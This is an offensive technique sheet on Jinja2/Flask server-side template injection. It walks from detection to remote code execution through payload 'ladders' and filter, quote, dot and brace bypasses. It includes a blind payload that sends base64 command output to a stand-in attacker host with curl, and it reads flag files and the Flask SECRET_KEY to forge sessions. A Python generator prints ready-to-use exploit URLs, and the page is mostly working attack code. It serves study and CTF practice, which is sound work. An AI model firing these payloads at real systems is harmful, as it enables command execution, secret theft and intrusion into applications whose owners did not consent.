---
title: "SSTI - Jinja2 / Flask Detection to RCE (Full Bypass Ladder)"
category: web
subcategory: ssti
type: technique
tags: [ssti, template-injection, jinja2, flask, render-template-string, python, rce, sandbox-escape, subclasses, mro, globals, popen, os-system, lipsum, cycler, url-for, attr, tplmap, sstimap, burp]
difficulty: medium
summary: "User input reaches a Jinja2 template body: walk object.__class__.__mro__ or a global like lipsum to __builtins__ and get os.popen."
when_to_use:
  - "Input is reflected and {{7*7}} renders as 49 (or {{7*'7'}} renders 7777777)"
  - "Flask/Django-ish Python stack, error pages mention jinja2/TemplateSyntaxError"
  - "A 'name', 'template', 'theme', 'message' or email-template parameter is echoed"
  - "You control a template file, a i18n .po string, or a DB-stored template fragment"
tools: [tplmap, sstimap, burp, curl, python3]
related: [ssti-other-engines, python-format-string-leak, python-flask-django-attacks, deser-python-pickle]
---

## TL;DR

Jinja2 evaluates `{{ ... }}` as a Python expression in a *sandbox-less* context (plain
`jinja2.Template` / `render_template_string`). Any Python object reachable from the template
namespace gives you `__class__` -> `__mro__` -> `object` -> `__subclasses__()` -> a class whose
`__init__.__globals__` contains `os`/`sys`/`__builtins__`. From `__builtins__` you get
`__import__`, `eval`, `open`. That is RCE. Everything else on this page is about getting there
when characters are filtered.

## Recognise it

- `{{7*7}}` -> `49`. Confirms an expression language, not necessarily Jinja2.
- `{{7*'7'}}` -> `7777777` means **Python** (Jinja2/Nunjucks-on-Python-semantics); Twig gives `49`.
- `{{config}}` dumps a Flask `Config` object -> Jinja2 in Flask, and you already leaked `SECRET_KEY`.
- `{{self}}` -> `<TemplateReference None>`.
- `${7*7}` not evaluated but `{{7*7}}` is -> Jinja2/Twig family, not Freemarker/Velocity.
- Error text: `jinja2.exceptions.TemplateSyntaxError`, `UndefinedError: 'x' is undefined`.
- Polyglot probe `${{<%[%'"}}%\` -> Jinja2 raises `TemplateSyntaxError: unexpected '}'`.
- `{%print(7*7)%}` works even when `{{` is filtered (statement block, not expression block).

## Theory

Jinja2 compiles `{{expr}}` to Python. The expression may use:

- **Attribute access**: `a.b`, which Jinja resolves as `getattr(a,'b')` then falls back to `a['b']`.
- **Subscript**: `a['b']`, `a[0]`.
- **Filters**: `a|attr('b')`, `a|map`, `a|join`, `a|list`, `a|string`, `a|int`.
- **Globals** injected by Jinja/Flask: `range`, `dict`, `lipsum`, `cycler`, `joiner`, `namespace`,
  and in Flask: `request`, `session`, `config`, `g`, `url_for`, `get_flashed_messages`.

Two independent ladders reach `__builtins__`:

1. **MRO ladder** (works with no Flask, no globals):
   `''.__class__.__mro__[1].__subclasses__()` -> list of every loaded class. Find one whose
   `__init__.__globals__` has `os` (e.g. `subprocess.Popen`, `warnings.catch_warnings`,
   `os._wrap_close`, `_frozen_importlib_external.FileLoader`).
2. **Globals ladder** (shorter, no index guessing):
   `lipsum.__globals__`, `cycler.__init__.__globals__`, `joiner.__init__.__globals__`,
   `url_for.__globals__`, `get_flashed_messages.__globals__`, `request.application.__globals__`.
   All of these land in a module namespace that has `__builtins__`.

`__builtins__` inside a module `__globals__` is a **dict** (not the module), so
`x['__builtins__']['__import__']('os')` works.

## Attack

### Ladder 0 - confirm and orient

```jinja
{{7*7}}
{{7*'7'}}
{{config}}
{{config.items()}}
{{self.__init__.__globals__.__builtins__}}
{{request.application.__globals__}}
```

### Ladder 1 - shortest RCE (Flask, nothing filtered)

```jinja
{{lipsum.__globals__.os.popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}
{{url_for.__globals__.os.popen('id').read()}}
{{get_flashed_messages.__globals__.os.popen('id').read()}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
{{lipsum.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
```

### Ladder 2 - no Flask globals, pure MRO

```jinja
{{''.__class__.__mro__[1].__subclasses__()}}
{# find the index of subprocess.Popen, then: #}
{{''.__class__.__mro__[1].__subclasses__()[NNN]('id',shell=True,stdout=-1).communicate()[0]}}
{# index-free, robust one-liner: #}
{% for c in ''.__class__.__mro__[1].__subclasses__() %}{% if c.__name__=='Popen' %}{{c('id',shell=True,stdout=-1).communicate()[0]}}{% endif %}{% endfor %}
{# warnings.catch_warnings route (classic, index varies): #}
{{''.__class__.__mro__[1].__subclasses__()[NNN].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
```

### Ladder 3 - `__class__` / `__` blacklisted

`|attr()` avoids the dot; string concatenation avoids the literal `__class__`.

```jinja
{{''|attr('__class'+'__')}}
{{''|attr(request.args.c)}}&c=__class__
{{request|attr((request.args.a|string)+(request.args.b|string))}}&a=__cla&b=ss__
{{()|attr("\x5f\x5fclass\x5f\x5f")}}
{{''['\x5f\x5fclass\x5f\x5f']}}
{# full chain with no literal underscores in the template, all from query args: #}
{{()|attr(request.args.c)|attr(request.args.b)|first|attr(request.args.s)()}}
```

With `request.args` you move every forbidden token out of the template and into the query string.
`request.values`, `request.cookies`, `request.headers`, `request.form`, `request.json` all work
identically and let you dodge WAFs that only inspect the URL.

### Ladder 4 - no dots at all

Everything becomes subscript or `|attr`.

```jinja
{{ ''['__class__']['__mro__'][1]['__subclasses__']() }}
{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1) }}
{{ lipsum['__globals__']['os']['popen']('id')['read']() }}
{{ request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']() }}
```

### Ladder 5 - no quotes

Build strings out of `request.args`, or out of arithmetic on characters.

```jinja
{# chr() from a subclass's globals, then concatenate: #}
{% set chr=lipsum|attr(request.args.g)|attr(request.args.gi)(request.args.bi)|attr(request.args.gi)(request.args.chr) %}
{# simplest: pull every string from the query string #}
{{lipsum[request.args.g][request.args.o][request.args.p](request.args.cmd)[request.args.r]()}}
&g=__globals__&o=os&p=popen&cmd=id&r=read

{# quote-free via dict/list constructors and |join: #}
{{ (dict(a=1)|list|first) }}            {# -> 'a' #}
{{ (dict(pop=1)|list|first) }}          {# -> 'pop' #}
{{ (dict(po=1,pen=1)|list|join) }}      {# -> 'popen' (dict order = insertion order) #}
{{ lipsum|attr(dict(__glob=1,als__=1)|list|join) }}
```

`dict(x=1)|list|first` yields the literal `x` without a single quote character. Chain
`|join` over a multi-key dict to build arbitrary identifiers.

### Ladder 6 - no braces `{{ }}`

Use statement blocks, or the `{%print%}` tag.

```jinja
{%print(lipsum.__globals__.os.popen('id').read())%}
{%if lipsum.__globals__.os.popen('id').read()%}yes{%endif%}
{% set x=lipsum.__globals__.os %}{%print x.popen('id').read()%}
{# or, if only '{{' is filtered but '{' is not, some naive filters miss: #}
{ {7*7} }
```

If `{%` is also filtered you have no Jinja syntax left; pivot to `{#` comment-only injection
(useless) or find a second sink.

### Ladder 7 - output is not reflected (blind)

```jinja
{%print(lipsum.__globals__.os.popen('curl http://ATTACKER/`id|base64 -w0`').read())%}
{{lipsum.__globals__.os.popen('sleep 7').read()}}
{# write a file into the webroot #}
{{lipsum.__globals__['__builtins__'].open('/app/static/p.txt','w').write(lipsum.__globals__.os.popen('id').read())}}
```

### Ladder 8 - RCE is blocked, you only need the flag

```jinja
{{config}}
{{config.SECRET_KEY}}
{{self.__init__.__globals__}}
{{lipsum.__globals__['__builtins__'].open('/flag').read()}}
{{''.__class__.__mro__[1].__subclasses__()[NNN]('/flag').read()}}   {# FileLoader/_io.FileIO #}
{{request.environ}}
{{g}}
```

## Code

```python
#!/usr/bin/env python3
"""Jinja2 SSTI helper: payload ladder generator + local proof-of-concept.

Runs a real Jinja2 render when jinja2 is installed (self-test proves the MRO
ladder actually reaches os), and always self-tests the pure payload builders.
"""
from __future__ import annotations

import argparse
import sys
import urllib.parse

# --------------------------------------------------------------------------
# Payload builders
# --------------------------------------------------------------------------

GLOBALS = ["lipsum", "cycler.__init__", "joiner.__init__", "namespace.__init__",
           "url_for", "get_flashed_messages", "request.application"]


def quick_rce(cmd: str) -> list[str]:
    """Shortest Flask/Jinja2 RCE one-liners."""
    out = []
    for g in GLOBALS:
        out.append("{{%s.__globals__.os.popen(%r).read()}}" % (g, cmd))
    out.append("{{%s.__globals__['__builtins__']['__import__']('os')"
               ".popen(%r).read()}}" % ("lipsum", cmd))
    return out


def mro_rce(cmd: str) -> str:
    """Index-free MRO walk, works outside Flask."""
    return (
        "{% for c in ''.__class__.__mro__[1].__subclasses__() %}"
        "{% if c.__name__=='Popen' %}"
        "{{c(" + repr(cmd) + ",shell=True,stdout=-1).communicate()[0]}}"
        "{% endif %}{% endfor %}"
    )


def no_dot(cmd: str) -> str:
    """Subscript-only chain: no '.' character anywhere in the expression."""
    return ("{{lipsum['__globals__']['os']['popen'](%r)['read']()}}" % cmd)


def no_underscore(cmd: str, base: str = "lipsum") -> tuple[str, dict[str, str]]:
    """Move every '_' token into the query string via request.args."""
    tpl = "{{%s[request.args.g][request.args.o][request.args.p]" \
          "(request.args.c)[request.args.r]()}}" % base
    args = {"g": "__globals__", "o": "os", "p": "popen", "c": cmd, "r": "read"}
    return tpl, args


def no_quote(ident: str) -> str:
    """Build an identifier with zero quote characters using dict()|list|join."""
    # split into <=8 char chunks so each becomes a keyword argument
    chunks = [ident[i:i + 8] for i in range(0, len(ident), 8)]
    kw = ",".join("%s=1" % c for c in chunks)
    return "(dict(%s)|list|join)" % kw


def no_brace(cmd: str) -> str:
    """Statement-block form for when '{{' is filtered."""
    return "{%%print(lipsum.__globals__.os.popen(%r).read())%%}" % cmd


def blind(cmd: str, host: str) -> str:
    inner = "%s | base64 -w0" % cmd
    return ("{%%print(lipsum.__globals__.os.popen("
            "'curl http://%s/`%s`').read())%%}" % (host, inner))


def as_url(base: str, param: str, payload: str,
           extra: dict[str, str] | None = None) -> str:
    q = {param: payload}
    if extra:
        q.update(extra)
    return base + "?" + urllib.parse.urlencode(q)


def ladder(cmd: str, host: str) -> list[tuple[str, str]]:
    tpl, args = no_underscore(cmd)
    return [
        ("detect-math", "{{7*7}}"),
        ("detect-python", "{{7*'7'}}"),
        ("detect-flask", "{{config}}"),
        ("polyglot", "${{<%[%'\"}}%\\"),
        ("quick", quick_rce(cmd)[0]),
        ("quick-cycler", quick_rce(cmd)[1]),
        ("mro", mro_rce(cmd)),
        ("no-dot", no_dot(cmd)),
        ("no-underscore", tpl + "   [args: " + repr(args) + "]"),
        ("no-quote-ident", "{{lipsum|attr(" + no_quote("__globals__") + ")}}"),
        ("no-brace", no_brace(cmd)),
        ("blind", blind(cmd, host)),
        ("read-flag", "{{lipsum.__globals__['__builtins__'].open('/flag').read()}}"),
    ]


# --------------------------------------------------------------------------
# Local proof: render the payloads against a real Jinja2 environment
# --------------------------------------------------------------------------

def local_proof(payload: str) -> str:
    """Render a payload with jinja2 if available. Returns '' when not installed."""
    try:
        import jinja2
    except ImportError:
        return ""
    return jinja2.Template(payload).render()


def main() -> int:
    p = argparse.ArgumentParser(description="Jinja2 SSTI ladder")
    p.add_argument("-c", "--cmd", default="id")
    p.add_argument("-H", "--host", default="127.0.0.1:8000")
    p.add_argument("-u", "--url", help="print ready URLs for this base + param")
    p.add_argument("-p", "--param", default="name")
    a = p.parse_args()
    for name, payload in ladder(a.cmd, a.host):
        if a.url:
            print("%-16s %s" % (name, as_url(a.url, a.param, payload)))
        else:
            print("%-16s %s" % (name, payload))
    return 0


def _self_test() -> None:
    assert "{{7*7}}" in [p for _, p in ladder("id", "h")][0]
    assert "lipsum.__globals__.os.popen('id').read()" in quick_rce("id")[0]
    assert "." not in no_dot("id").split("lipsum")[1].split("(")[0]
    assert "Popen" in mro_rce("id") and "__subclasses__" in mro_rce("id")
    tpl, args = no_underscore("id")
    assert "_" not in tpl and args["g"] == "__globals__"
    # dict()|list|join identifier builder
    q = no_quote("__globals__")
    assert "'" not in q and '"' not in q and "dict(" in q
    assert no_brace("id").startswith("{%print(")
    assert "{{" not in no_brace("id")
    assert "base64" in blind("id", "h")
    # If jinja2 is present, prove the MRO ladder really reaches os.
    out = local_proof("{{ ''.__class__.__mro__[1].__subclasses__()|length > 10 }}")
    if out:
        assert out.strip() == "True", out
        got = local_proof(
            "{% for c in ''.__class__.__mro__[1].__subclasses__() %}"
            "{% if c.__name__=='catch_warnings' %}"
            "{{c.__init__.__globals__['__builtins__']['sum']([1,2,3])}}"
            "{% endif %}{% endfor %}")
        assert "6" in got, got
    print("[ok] all self-tests passed"
          + ("" if out else " (jinja2 not installed, render proof skipped)"))


if __name__ == "__main__":
    if len(sys.argv) == 1:
        _self_test()
    else:
        raise SystemExit(main())
```

## Variants & pitfalls

- **`{{7*7}}` renders 49 but nothing else works** -> it is probably Twig or Nunjucks, not Jinja2.
  `{{7*'7'}}`: Jinja2 `7777777`, Twig `49`, Nunjucks `49` (JS coercion).
- **`SandboxedEnvironment`**: `__class__`, `__mro__`, `__subclasses__`, `__globals__` and
  anything starting with `_` are blocked by `is_safe_attribute`. Escapes historically rely on
  format-string pivots (`{{ "{}".format }}` / `str.format_map`, see `python-format-string-leak`)
  or on a callable already in the context whose return value is unsandboxed.
- **`__subclasses__()` index shifts** between Python versions, imports and web servers. Never
  hardcode an index; use the `{% for %}` + `__name__` loop.
- **`os` not in `lipsum.__globals__`**: Jinja2 3.x `lipsum` lives in `jinja2.utils`, which does
  import `os` in most builds. Fall back to `__builtins__.__import__('os')` which always works.
- **Output escaping**: `autoescape=True` escapes the *rendered value*, not the expression. RCE is
  unaffected; only reading HTML-ish flags looks mangled.
- **`{{` is stripped once**: try `{{{{7*7}}}}` or `{{7*7}}}}` -- a naive `.replace('{{','')` pass
  leaves a working tag behind.
- **Length limits**: use `{%set%}` across multiple injections if the app concatenates fields, or
  put everything in `request.args`/`request.headers` and keep the template tiny.
- **Newline-sensitive filters**: `{%\nprint(...)%}` and `{{\t7*7\t}}` both parse; whitespace after
  `{{` and before `}}` is ignored, which defeats exact-string blacklists.
- **Flask `config` as a write primitive**: `{{config.update(x=1)}}` returns None but mutates; with
  `config['SECRET_KEY']` leaked you can forge session cookies instead of going for RCE.
- **Django templates are not Jinja2**: `{{7*7}}` does not render in Django's DTL. See
  `ssti-other-engines`.

## Tools

- `tplmap` / `SSTImap` -- automatic detection and exploitation, `--os-shell`.
- Burp Intruder with the polyglot `${{<%[%'"}}%\` across every parameter.
- `curl -G --data-urlencode 'name={{7*7}}' http://host/` for quick probing.
- Local `python3 -c "import jinja2;print(jinja2.Template(open('p.j2').read()).render())"` to
  debug a payload offline before firing it.

## References

- PortSwigger Web Security Academy -- Server-side template injection labs.
- PayloadsAllTheThings -- Server Side Template Injection section.
- James Kettle -- "Server-Side Template Injection: RCE for the modern webapp" (BlackHat USA 2015).
- Jinja2 documentation -- sandbox module, `is_safe_attribute`.
